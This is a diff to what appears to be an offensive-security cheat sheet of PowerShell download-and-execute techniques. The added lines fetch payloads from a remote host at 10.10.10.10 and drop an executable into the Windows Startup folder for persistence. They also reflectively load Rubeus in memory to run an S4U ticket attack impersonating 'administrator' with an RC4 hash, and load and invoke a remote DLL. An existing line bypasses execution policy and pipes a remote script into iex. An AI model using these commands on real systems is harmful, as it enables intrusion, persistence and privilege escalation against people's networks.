@@ -12,6 +12,22 @@ From an HTTP server
 
 ```powershell
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+
+# Download only
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
+Invoke-WebRequest "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
+
+# Download and run Rubeus, with arguments
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
+
+# Execute a specific method from an assembly 
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
 ```
 
 From a Webdav server
